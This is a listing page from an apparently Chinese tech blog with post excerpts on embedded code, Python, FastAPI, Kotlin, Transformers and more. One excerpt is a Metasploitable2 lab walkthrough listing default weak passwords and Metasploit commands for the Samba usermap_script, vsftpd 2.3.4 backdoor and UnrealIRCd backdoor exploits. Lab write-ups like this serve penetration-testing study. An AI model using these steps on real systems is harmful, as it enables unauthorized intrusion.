	<div class="content list__excerpt post__content clearfix">
		CubeMX配置 对于 STM32 F407VE
这里的84是来自APB1那路2倍频得到：
代码部分 两个舵机都是180度的
servo.c #include "servo.h" #include "tim.h" #include "stdio.h" __IO uint32_t g_SteerUWT[2] = {0}; uint16_t g_SteerDeg[2] = {0}; uint8_t g_SteerSele[2] = {0}; uint16_t g_servoMidAngle[2] = {SERVO1_MID, SERVO2_MID}; /*对于 舵机 设置角度值*/ //# 设置频率为50hz也就是20ms一个周期， //# 控制舵机范围是在0.5ms到2.5ms之间，也就是2.50%到12.50%之间 //# 最小精度是0.01ms，也就是0.05% //# 对于20000： //#	0.05% == 10 //# 2.50% == 500 //#	12.50% == 2500 void servo_Init(void) { HAL_TIM_Base_Start_IT(&amp;SERVO1_TIM);	//开启定时器 HAL_TIM_Base_Start_IT(&amp;SERVO1_TIM);	//开启定时器 HAL_TIM_PWM_Start(&amp;SERVO1_TIM, SERVO1_CHANNEL); HAL_TIM_PWM_Start(&amp;SERVO1_TIM, SERVO2_CHANNEL); SERVO_1 = g_servoMidAngle[0]; SERVO_2 = g_servoMidAngle[1]; } /* seleSteer：选择不同舵机 val：500~2500对应0~180度 */ void servo_value_set(uint8_t seleSteer, uint16_t val) { g_SteerDeg[seleSteer] = val;	// val*10+500; g_SteerSele[seleSteer] = 1; } uint16_t servo_get_value(uint8_t seleSteer) { uint32_t getVal; switch(seleSteer) { case SERVO1: getVal = SERVO_1; break; case SERVO2: getVal = SERVO_2; break; default: break; } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0faed4f73faa9fcae8a8e124e7899d88/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0375c0ec9a61bbc30d926d2465878bc8/" rel="bookmark">
			外企面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Interview Prepare is there anyone we can talk to for a character reference?
yes, I have some teammate can help to provide related working information.
why did you leave/quit your last job?
I got blocked on my last job. I found I cant learn new things from my last job, for my personal development. so i quit.
can you tell me about some of your accomplishment?
I did 2 great things on my last job,
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0375c0ec9a61bbc30d926d2465878bc8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf995a05f7d505bfd6226ad33c89b5c0/" rel="bookmark">
			FastAPI入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
FastAPI
FastAPI 是什么
为什么要用 FastAPI
FastAPI 入门
安装
用 FastAPI 写个接口
调试接口
创建快捷请求
保存为快捷请求
发送请求
总结
FastAPI FastAPI 是什么 什么是 FastAPI 呢？ FastAPI 是 Python 的一个框架，如果要类比的话，那就是：
Nodejs 和 NestjsJava 和 SpringPhp 和 ThinkPhp 为什么要用 FastAPI 为什么要选 FastAPI 呢？
顾名思义，很快，速度很快，性能很强提高开发效率，毕竟封装得很完善BUG率低，增加一些提示，减少BUG简单快捷，用起来非常方便社区健壮，遇到问题可以快速解决标准，基于 OpenAPI 和 JSON SCHEMA 详细了解：OpenAPI 是什么？
FastAPI 入门 安装 首先你的电脑需要有 Python3.7 以上的环境才能安装，在终端中执行以下操作：
就完成了基本的环境安装
用 FastAPI 写个接口 写完运行一下
调试接口 当我们写完一个接口时，需要对这个接口进行调试，今天我就使用 Apifox 对接口进行调试
创建快捷请求 两个接口分别是：
创建 /api/v1/hw 创建 /api/v1/items/{item_id} 保存为快捷请求 可以选择保存为快捷请求，并填入对应信息~
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf995a05f7d505bfd6226ad33c89b5c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1568c409f79b5e07d734a82b1e59bdbc/" rel="bookmark">
			嵌入式开发专业名词解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 IDE IED就是我们编写代码的工具。有些工具还能提供编译、烧写、生成可执行程序功能。比如keil就是一个IDE工具，开发安装程序的Android studio也称为IDE工具。由此可知IDE工具就是一系列集成开发、编译、生成可执行程序的工具集合的工具集。在不用的领域使用不同的IDE工具。
C51和STM32 C51和STM32都是微型处理器，也称为MCU，不同的是这个两种的不同微型处理器是不同的芯片厂商生产的而已。当然这两个微型处理器因为出生的年代不同，芯片的性能也不同，设计的架构也不同，但是在大类来看都是属于微型控制器。
JTAG JTAG一种工具，用于调试我们编写的程序出现错误了定位问题。
串口/打印调试 一种工具或者方法，用于调试我们编写的程序出现错误了定位问题。
串口助手 一种工具，使用的时候和MCU的串口一起连接，通过显示MCU传输到电脑上的数据知道MCU中的程序的执行流程，然后在出现错误的时候快速定位代码运行的错误。
逻辑分析仪 逻辑分析仪是分析数字系统逻辑关系的仪器。就是将电路中的波形采集出来，让后上传到电脑中，我们可以通过电脑软件可视化查看电路波形的一个软件，普通逻辑分析仪可以查看串口、I2C、SPI等接口的波形。
示波器 简单来看和逻辑分析的功能类似，但是逻辑分析仪器只能采集为高电平或者低电平。但是示波器能真实的看到电路上的波形，波形的形状，电压等。而且还可以准确的看到电路的波形是否有尖刺、台阶等都可以看的和清楚。总的来说就是一个能将电路上真实的波形展示给你观看的仪器。
update continue 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/496f604102770166ad22d3fcb8312602/" rel="bookmark">
			Kotlin重点理解安全性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一 Kotlin安全性1.1 可空类型1.2 安全调用运算符1.3 Elvis 运算符1.4 非空断言运算符1.5 安全类型转换1.6 延迟初始化 一 Kotlin安全性 Kotlin 在设计时采用了一系列策略，旨在尽可能地减少空指针异常（NullPointerException）的出现。空指针异常是许多编程语言中常见的错误之一，Kotlin 通过以下几种方式来避免它：
可空类型（Nullable Types）：Kotlin引入了可空类型的概念，允许变量具有可以存储空值的能力。在 Kotlin 中，如果一个变量可能为 null，必须显式地声明为可空类型。例如，使用 String? 表示一个可能为null的字符串类型。这样做可以在编译时就捕捉到潜在的空指针异常，因为 Kotlin 不允许直接对可空类型进行操作，除非先进行非空判断或者安全调用。安全调用运算符（Safe Call Operator）：在 Kotlin 中，可以使用 ?. 运算符来调用可空对象的方法或访问其属性。如果对象为 null，则整个表达式将返回 null 而不会导致空指针异常。例如，obj?.someMethod() 将返回 null，如果 obj 是 null，否则调用 someMethod() 方法。Elvis 运算符（Elvis Operator）：Elvis 运算符 ?: 可以用于提供默认值，如果表达式的值为 null，则可以返回提供的默认值。例如，val length = str?.length ?: 0 表示如果 str 是 null，length 将赋值为 0。非空断言运算符（Non-null Assertion Operator）：有时候我们可以确定某个可空类型的变量在某个地方不会为 null，这时可以使用非空断言运算符 !! 来显式地告诉编译器该变量不会为 null。但是需要小心使用它，如果变量为 null，将会触发空指针异常。安全类型转换（Safe Cast）：使用 as? 运算符进行安全类型转换，如果转换失败，则返回 null。这样可以避免在类型转换时出现空指针异常。延迟初始化：在 Kotlin 中，类的属性可以使用 lateinit 延迟初始化，这使得在声明属性时不需要立即初始化，而可以在稍后进行初始化。但是要小心使用延迟初始化，必须确保在使用该属性之前已经初始化，否则会抛出异常。 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/496f604102770166ad22d3fcb8312602/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d1f1df929daff489476f3e3c9dd42a9/" rel="bookmark">
			大文件上传如何做断点续传?全端&#43;后端结合开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		断点续存是什么? 断点续传（Resumable File Upload）是一种文件上传的技术，它允许在上传过程中出现中断或失败的情况下，能够从中断的位置继续上传，而不需要重新上传整个文件。这在处理大文件或不稳定的网络连接时非常有用。
断点续传的实现通常涉及以下几个关键概念和步骤：
分片：将大文件分割成较小的文件块（通常是固定大小的块），每个块都有一个唯一的标识符。
上传请求：客户端发起上传请求，并将文件分片按顺序上传到服务器。
上传状态记录：服务器端需要记录上传的状态，包括已接收的分片、分片的顺序和完整文件的大小等信息。
中断处理：如果上传过程中发生中断（例如网络中断、用户主动中止等），客户端可以记录已上传的分片信息，以便在恢复上传时使用。
恢复上传：当上传中断后再次开始上传时，客户端可以发送恢复上传请求，并将已上传的分片信息发送给服务器。
服务器处理：服务器接收到恢复上传请求后，根据已上传的分片信息，判断哪些分片已经上传，然后继续接收剩余的分片。
合并文件：当所有分片都上传完成后，服务器将所有分片按顺序组合成完整的文件。
下面是一个简化的断点续传流程图：
客户端 服务器 | | |------ 发起上传请求 ------------------&gt;| | | |------ 上传分片1 --------------------&gt;| | | |------ 上传分片2 --------------------&gt;| | | | ... | | | |------ 上传分片N --------------------&gt;| | | |------ 中断或失败 --------------------&gt;| | | |------ 发起恢复上传请求 ---------------&gt;| | | |------ 发送已上传分片信息 ------------&gt;| | | | ... | | | |------ 上传剩余分片 ------------------&gt;| | | |------ 上传完成 ----------------------&gt;| | | |------ 合并分片为完整文件 ------------&gt;| | | |&lt;----- 上传成功响应 --------------------| | | 上述流程图描述了客户端和服务器之间的交互过程。客户端发起上传请求，并逐个上传分片，如果中断或失败，客户端可以恢复上传并将已上传的分片信息发送给服务器。服务器根据已上传的分片信息，继续接收剩余的分片。当所有分片上传完成后，服务器将它们合并成完整的文件，并向客户端发送上传成功的响应。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5d1f1df929daff489476f3e3c9dd42a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc56bd8fc1ad85982184e847e95dfdc4/" rel="bookmark">
			python系统监控程序 时间 CPU内存使用率 硬盘大小 天气 日历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import sys from PyQt5.QtGui import QPainter, QColor, QFont from PyQt5.QtCore import Qt, QPoint, QTimer, QTime, QDate, QThread import psutil from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout import subprocess from PyQt5.QtWidgets import QApplication, QWidget, QCalendarWidget import wmi import urllib.request import re class CustomWindow1(QWidget): def __init__(self): super().__init__() # 设置窗口属性 self.setWindowFlags(Qt.FramelessWindowHint) self.setAttribute(Qt.WA_TranslucentBackground) # 设置窗口大小 self.resize(400, 120) # 创建两个label控件 self.label1 = QLabel(self) self.label1.move(20, 20) self.label1.setFont(QFont('Arial', 12)) self.label2 = QLabel(self) self.label2.move(20, 60) self.label2.setFont(QFont('Arial', 12)) # 创建定时器，每秒更新时间和日期 self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc56bd8fc1ad85982184e847e95dfdc4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebae703abb111c7d774abc8f0218b2b7/" rel="bookmark">
			HFSS常见报错问题整理（不断更新中）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于一些简单常见的HFSS问题，网上搜到的解决方法往往难以找到，对初学者并不友好。我作为一个HFSS学习者，对HFSS方面的解决方法进行了总结归纳。由于HFSS十分复杂，如有错误，恳请指正。欢迎大家交流学习、相互进步
一、弹窗类 1.弹窗：There can only be one solve setup in an auto-open design 即不能在同一个工程里同时进行多个求解
2.弹窗：A geometry must be selected to generate a plot 即就是需要选中一个模型或者板块
3. 弹窗：do you want to create a non model object? 当我们求解计算过后，如果想要修改模型的话，常常会出现上面的弹框，此时点 否 即可。
二、求解信息栏类 1.求解信息栏：Adaptive Passes did not converge based on specified criteria 即结果不收敛，应再增加运算的pass数目。如默认的计算步数是6步，也就是说计算了6步后还没有达到所需的收敛精度，可以把pass设置成更多.
2.求解信息栏：error：non-manifold vertices/edges found for part “xxx” 通常是因为我们在进行模型搭建或改变的时候，在没有对模型进行相加或相减操作时，因为搭建或参数变化等原因造成了某部分结构“xxx”的叠加或断开情况， 从而使得计算不能连续，改一下就好了。
三、后处理类 1.为什么将一个工程复制后再运行结果与前一工程结果不一致？ 在遇到该类情况中，本人遇到的大多数原因是精度不够，或将单点扫频改为频段扫频
2.为什么在Optimetrics（优化）中部分变量无法选中？
如图，上面白色可以勾选，为什么下面是灰色无法选中呢？
查看是否是选中了 Read-only 选项，如果选择，则取消即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14e5a60bc66615ad353a1be6a5bc3cae/" rel="bookmark">
			Python--HTTP 库【requests库】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		requests是一个常用的 Python HTTP 库，用于发送 HTTP 请求和处理响应。它提供了简洁且易于使用的接口，使得在 Python 中进行网络通信变得非常方便。
如何使用requests 库： 主要分为一下几个过程：发送Http请求➡处理相应➡传递参数➡设置请求头➡处理Cookies➡处理会话
发送Http请求 根据接口的请求类型来发送请求大致分为以下几个类型：
requests.get() ➡ Get请求
requests.post() ➡ Post请求
requests.put() ➡ Put请求
requests.delete() ➡ Delete()请求
通过上面方法发送不同类型的 HTTP 请求。这些方法接受 URL、参数、请求头和请求体等参数，并返回包含响应数据的 Response 对象
处理响应 Response 对象包含响应的状态码、响应头和响应体等信息
response.status_code 获取状态码response.headers 获取响应头获取响应体 response.text ➡ 文本格式response.content ➡ 字节格式response.json() ➡ Json格式 传递参数 可以将参数作为字典或字符串传递给请求方法，这些参数将被自动编码并添加到 URL 或请求体中
Get请求传递参数示例 import requests url = "https://example.com/api" params = {"key1": "value1", "key2": "value2"} response = requests.get(url, params=params) print(response.url) Post请求传递参数示例 import requests url = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/14e5a60bc66615ad353a1be6a5bc3cae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/300848eb2c6809fe120f3ccb6f55f987/" rel="bookmark">
			Python--随机数库【random库】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		random 标准库提供了多种方便和实用的方法来生成随机数。以下是其中一些常用的方法
接下来我给大家列举一下比较常用的随机数方法：
代码示例⬇⬇⬇⬇⬇⬇⬇： 1、random.random(): 生成一个范围在 [0, 1) 的随机浮点数 import random rand_num = random.random() print(rand_num) 2、random.randint(a, b): 生成一个指定范围内的随机整数，包括 a 和 b。 import random rand_int = random.randint(1, 10) print(rand_int) 3、random.uniform(a, b): 生成一个指定范围内的随机浮点数，包括 a 和 b import random rand_float = random.uniform(1.0, 10.0) print(rand_float) 4、random.choice(seq): 从一个序列中随机选择一个元素。 import random my_list = [1, 2, 3, 4, 5] rand_choice = random.choice(my_list) print(rand_choice) 5、random.shuffle(seq): 随机打乱一个序列的顺序，直接在原序列上进行修改。 import random my_list = [1, 2, 3, 4, 5] random.shuffle(my_list) print(my_list) 6、random.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/300848eb2c6809fe120f3ccb6f55f987/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a05ff54462aee7c9d81de21d5ee77fd8/" rel="bookmark">
			Python之pdf内容读取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 import pandas as pd import pdfplumber with pdfplumber.open(r'C:\Users\2023\02\开发.pdf') as pdf: for page in pdf.pages: #输出文本内容，类型为STR print(type(page.extract_text())) #获取表格 tables=page.extract_tables() tables_n=len(tables) for ind in range(tables_n): #表格第一行为标题，类型为pandas.core.frame.DataFrame转换为list print(pd.DataFrame(tables[ind][1:],columns=tables[ind][0]).values.tolist()) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f116855d30a986f077dfc54e37fbe3d/" rel="bookmark">
			2023国赛数学建模C题思路分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0 赛题思路1 竞赛信息2 竞赛时间3 建模常见问题类型3.1 分类问题3.2 优化问题3.3 预测问题3.4 评价问题 4 建模资料 0 赛题思路 （赛题出来以后第一时间在CSDN分享）
https://blog.csdn.net/dc_sinor?type=blog
1 竞赛信息 全国大学生数学建模竞赛（以下简称竞赛）是中国工业与应用数学学会主办的面向全国大学生 的群众性科技活动，旨在激励学生学习数学的积极性，提高学生建立数学模型和运用计算机技术解 决实际问题的综合能力，鼓励广大学生踊跃参加课外科技活动，开拓知识面，培养创造精神及合作 意识，推动大学数学教学体系、教学内容和方法的改革。
竞赛题目一般来源于科学与工程技术、人文与社会科学（含经济管理）等领域经过适当简化加工的实际问题，不要求参赛者预先掌握深入的专门知识，只需要学过高等学校的数学基础课程。题目有较大的灵活性供参赛者发挥其创造能力。参赛者应根据题目要求，完成一篇包括模型的假设、建立和求解、计算方法的设计和计算机实现、结果的分析和检验、模型的改进等方面的论文（即答卷）。竞赛评奖以假设的合理性、建模的创造性、结果的正确性和文字表述的清晰程度为主要标准。
竞赛分为本科组和专科组进行。本科学生只能参加本科组竞赛，不能参加专科组竞赛。专科（高职高专）学生一般参加专科组竞赛，也可参加本科组竞赛，无论参加何组竞赛，均必须在报名时确定，报名截止后不能再更改报名组别。同一参赛队的学生必须来自同一所学校。
2 竞赛时间 报名结束时间：2023年9月4日20:00
比赛开始时间：2023年9月7日（周四）18:00
比赛结束时间：2023年9月10日（周日）20:00
3 建模常见问题类型 趁现在赛题还没更新，A君给大家汇总一下国赛数学建模经常使用到的数学模型，题目八九不离十基本属于一下四种问题，对应的解法A君也相应给出
分别为：
分类模型
优化模型
预测模型
评价模型
3.1 分类问题 判别分析：
又称“分辨法”，是在分类确定的条件下，根据某一研究对象的各种特征值判别其类型归属问题的一种多变量统计分析方法。
其基本原理是按照一定的判别准则，建立一个或多个判别函数；用研究对象的大量资料确定判别函数中的待定系数，并计算判别指标；据此即可确定某一样本属于何类。当得到一个新的样品数据，要确定该样品属于已知类型中哪一类，这类问题属于判别分析问题。
聚类分析：
聚类分析或聚类是把相似的对象通过静态分类的方法分成不同的组别或者更多的子集，这样让在同一个子集中的成员对象都有相似的一些属性，常见的包括在坐标系中更加短的空间距离等。
聚类分析本身不是某一种特定的算法，而是一个大体上的需要解决的任务。它可以通过不同的算法来实现，这些算法在理解集群的构成以及如何有效地找到它们等方面有很大的不同。
神经网络分类：
BP 神经网络是一种神经网络学习算法。其由输入层、中间层、输出层组成的阶层型神经网络，中间层可扩展为多层。RBF（径向基）神经网络：径向基函数(RBF-Radial Basis Function)神经网络是具有单隐层的三层前馈网络。它模拟了人脑中局部调整、相互覆盖接收域的神经网络结构。感知器神经网络：是一个具有单层计算神经元的神经网络，网络的传递函数是线性阈值单元。主要用来模拟人脑的感知特征。线性神经网络：是比较简单的一种神经网络，由一个或者多个线性神经元构成。采用线性函数作为传递函数，所以输出可以是任意值。自组织神经网络：自组织神经网络包括自组织竞争网络、自组织特征映射网络、学习向量量化等网络结构形式。K近邻算法：　K最近邻分类算法，是一个理论上比较成熟的方法，也是最简单的机器学习算法之一。
3.2 优化问题 线性规划：
研究线性约束条件下线性目标函数的极值问题的数学理论和方法。英文缩写LP。它是运筹学的一个重要分支，广泛应用于生产计划、物流运输、资源分配、金融投资等领域。建模方法：列出约束条件及目标函数；画出约束条件所表示的可行域；在可行域内求目标函数的最优解及最优值。
整数规划：
规划中的变量（全部或部分）限制为整数，称为整数规划。若在线性模型中，变量限制为整数，则称为整数线性规划。目前所流行的求解整数规划的方法往往只适用于整数线性规划。一类要求问题的解中的全部或一部分变量为整数的数学规划。从约束条件的构成又可细分为线性，二次和非线性的整数规划。
非线性规划：
非线性规划是具有非线性约束条件或目标函数的数学规划，是运筹学的一个重要分支。非线性规划研究一个 n元实函数在一组等式或不等式的约束条件下的极值问题，且 目标函数和约束条件至少有一个是未知量的非线性函数。目标函数和约束条件都是 线性函数的情形则属于线性规划。
动态规划：
包括背包问题、生产经营问题、资金管理问题、资源分配问题、最短路径问题和复杂系统可靠性问题等。
动态规划主要用于求解以时间划分阶段的动态过程的优化问题，但是一些与时间无关的静态规划(如线性规划、非线性规划)，只要人为地引进时间因素，把它视为多阶段决策过程，也可以用动态规划方法方便地求解。
多目标规划：
多目标规划是数学规划的一个分支。研究多于一个的目标函数在给定区域上的最优化。任何多目标规划问题，都由两个基本部分组成：
（1）两个以上的目标函数；
（2）若干个约束条件。有n个决策变量，k个目标函数， m个约束方程，则：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f116855d30a986f077dfc54e37fbe3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27c3711507d25c95ed695e3910e01f42/" rel="bookmark">
			Metasploitable2靶机漏洞复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、信息收集 nmap扫描靶机信息
二、弱口令 1.系统弱口令 在Kali Linux中使用telnet远程连接靶机
输入账号密码msfadmin即可登录
2.MySQL弱口令 使用mysql -h 靶机IP地址即可连接
3.PostgreSQL弱密码登录 输入psql -h 192.168.110.134 -U postgres
密码为postgres
输入\q可以退出
4.VNC弱口令 二、漏洞利用 一下漏洞利用工具基本均为MSF
1.Samba MS-RPC Shell命令注入 此漏洞允许远程攻击者在易受攻击的Samba服务器上上传和执行恶意代码。它影响了Samba版3.5.0到4.6.4（包括在内），并随Samba 4.6.5的发布进行了修补。
1.使用模块 use exploit/multi/samba/usermap_script 2.设置参数 set rhost 靶机IP地址 3.执行 run 4.执行命令查看目录 ls 2.vsftpd后门 vsftpd后门漏洞指的是vsftpd（Very Secure FTP Daemon）软件的一个安全漏洞，也被称“Backdoor-VSFTPd”或“vsftpd 2.3.4 Backdoor”。
这个漏洞最初发现于2011年，并影响了vsftpd版本2.3.4。攻击者可以利用该漏洞通过一个特定的用户名进行登录，然后在无需经过认证的情况下获得系统访问权限。
1.MSF中使用以下模块 use exploit/unix/ftp/vsftpd_234_backdoor 2.设置靶机IP set rhost 靶机IP 3.执行并查看 run ls 3.UnreallRCd后门 UnrealIRCd是一种常见的开源IRC服务器软件，被用于构建IRC（Internet Relay Chat）网络。在过去的几年中，UnrealIRCd曾发现过一个后门漏洞，被称为“UnrealIRCd后门”或“Unreal3.2.8.1Backdoor”。
这个后门漏洞于2010年被公开揭露。攻击者利用这个后门可以在受影响的UnrealIRCd服务器上获取远程执行代码的权限，也可以用于执行各种恶意活动，如监控聊天内容、获取敏感信息等。
1.搜索模块 search unreal ircd 2.搜索payload，并使用一下payload cmd/unix/bind_perl 3.设置参数 set rhost 靶机IP地址 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27c3711507d25c95ed695e3910e01f42/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e97e06b0561dbce4fa21ded0f6332b0b/" rel="bookmark">
			微信小程序抢购python脚本,python如何做抢东西软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，小编为大家解答python小程序抢购脚本怎么写的问题。很多人还不知道微信小程序抢购python脚本，现在让我们一起来看看吧！
本教程完成针对小白，大佬请绕道！！
本教程完成针对小白，大佬请绕道！！
本教程完成针对小白，大佬请绕道！！
重要的事情说三遍！
小白福音！！这两天问茅台脚本使用方法的人很多！！本人没有精力有限，所以弄了一个抢购软件！！
不需要安装Python,不需要配置环境，就和你在电脑上安装使用QQ等软件一样
公众号： Python编程与实战
PS:公众号后台回复 “茅台” 获取抢购软件！！
是 .exe 文件，点击 main.exe 就能运行
但是有个前提是需要更改 eid, fp 这两个参数
这两个参数在 config.ini 文件中
获取这两个参数的方法在第 4 步！！
你用软件抢购只看前面和第 4 步就可以了~~~
--------------------------------分割线------------------------------------------------------------
下面是安装Python, 配置开发环境抢购的教程，用软件的不用看！！！
下面是安装Python, 配置开发环境抢购的教程，用软件的不用看！！！
下面是安装Python, 配置开发环境抢购的教程，用软件的不用看！！！
因为问的人太多了，一方面，有时候没空回复，回复不及时，导致错过抢购..
另外大多数人问的都是同一类问题，我每次都要重复再重复回复同一个答案&lt;/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2cc1c4c08d0dbe378f2b3e45db9af07/" rel="bookmark">
			大语言模型之一 Attention is all you need ---Transformer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大语言模型已经在很多领域大显身手，其应用包括只能写作、音乐创作、知识问答、聊天、客服、广告文案、论文、新闻、小说创作、润色、会议/文章摘要等等领域。在商业上模型即产品、服务即产品、插件即产品，任何形态的用户可触及的都可以是产品，商业付费一般都是会员制或者按次收费。当前大预言模型的核心结构是基于Transformer。
大模型之所以效果超出预期，一个很重要的原因是模型大到一定程度之后会发生质变，模型的记忆性和泛化性可以兼得。而Transformer可以令模型很大，大到在NLP领域模型可以发生质变，这使得应用得以井喷式出现在各个领域，但是也有一些问题存在需要进一步解决，这类大模型本质上是内容生成，生成的内容因符合如下三原则：
有用的（Helpful）;
可信的（Honest）;
无害的（Harmless）
仅仅基于Transformer框架的大预言模型（又称pretraining model）还不足以完全满足商业应用要求，业界的发展放到后续博客展开，本篇先谈谈大语言模型的核心架构Transformer。
Transformer 源于谷歌Brain 2017年针对机器翻译任务提出的，《Attention is all you need》论文详细解释了网络结构，在这个之前网络结构多采用RNN、CNN、LSTM、GRU等网络形式，这篇文章提出了一个新的核心结构-Transformer，其针对RNN网络在机器翻译上的弱点重新设计的结构，传统的Encoder-Decoder架构在建模过程中，下一个时刻的计算过程会依赖于上一个时刻的输出，而这种固有的属性就限制了传统的Encoder-Decoder模型就不能以并行的方式进行计算。
本文源码已托管到 github link地址
模型结构介绍 谷歌提出的Transformer也是包括Encoder和decoder两个部分，只是这两个部分核心是Attention结构，而非CNN、LSTM、GRU等这些结构。
对于Encoder，包含两层，一个self-attention层和一个前馈神经网络，self-attention能帮助当前节点不仅仅只关注当前的词，从而能获取到上下文的语义。Decoder也包含encoder提到的两层网络，但是在这两层中间还有一层attention层，帮助当前节点获取到当前需要关注的重点内容。
Transformer 模型架构
模型需要对输入的数据进行一个embedding操作（图中红色框框），Attention虽然可以提取出关注的信息，但是没有时序信息，而Position Encoding正是将时序信息转为位置信息来实现的，enmbedding结束之后加上位置编码，然后再输入到encoder层，self-attention处理完数据后把数据送给前馈神经网络（蓝色Feed Forward），前馈神经网络的计算可以并行，得到的输出会输入到下一个encoder。
Encoder 编码器 Multi-Head Attention 多头自注意力机制，可以通过输入信息并行计算出查询-键-值（Query-Key-Value），来让后续的网络使用context来知道当前运算需要关注哪些信息。注意这里的计算QKV的矩阵也是网络参数的一部分，通过训练可以让网络的注意力更有效且集中。因为NLP领域都是时序上因果的，因而改进模型采用了因果多头自注意力模型。 Add 残差连接 这里主要残差连接的主要作用是利用恒等映射来训练更深层的网络（输入和输出恒等），多头注意力和层归一化，前馈神经网络和层归一化，两部分均采用了残差连接。 Norm 层归一化 Layer Normalization 的作用是把神经网络中以样本维度为一层来进行归一化运算，以起到加快训练速度，加速收敛的作用。新的改进都是将Layer Normalization放在前面而非后面。 Feed Forward 前馈神经网络 将通过了注意力层之后通过加权机制提取出的所关注信息，根据关注的信息在语义空间中做转换。因此MLP将Multi-Head Attention得到的向量再投影到一个更大的空间（论文里将空间放大了4倍）在那个大空间里可以更方便地提取需要的信息（使用Relu激活函数），最后再投影回token向量原来的空间。 Decoder 和 Encoder基本一样，组成分为Masked Multi-Head Attention，Masked Encoder-Decoder Attention（这一层就是连接编码器和解码器的注意力层，后续由于GPT只用了编码器，因此删除了这一层。）和Feed Forward神经网络，三个部分的每一个部分，都有一个残差连接，后接一个Layer Normalization。下面介绍Decoder的Masked Self-Attention和Encoder-Decoder Attention两部分，Masked Multi-Head Attention Self-Attention的机制有一个问题，在训练过程中的完整标注数据都会暴露在 Decoder 中，这显然是不对的，我们需要对 Decoder 的输入进行一些处理，该处理被称为 Mask，将数据有选择的暴露给Decoder（在GPT中相当于遮住了后面的所有数据，由网络依次生成）。 Multi-Head AttentionAdd 残差连接Norm 层归一化Feed Forward 前馈神经网络 线性层和Softmax
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2cc1c4c08d0dbe378f2b3e45db9af07/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71e61a9aa74732b491165ac250a7cef7/" rel="bookmark">
			非常好用Android自定义Dialog（确认/取消），自定义标题，背景模糊，点击边框外取消等
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习目标： 今天看了篇文章的自定义Dialog并且学习了一下，复刻的非常完美，这个Dialog我用于系统提示，包括提示用户登录，提示网络请求等等。文章也是照搬过来的无其他的修改
原文链接在这里
自定义Dialog的详细步骤（实现自定义样式一般原理）
学习内容： 提示：这里可以添加要学的内容
例如：
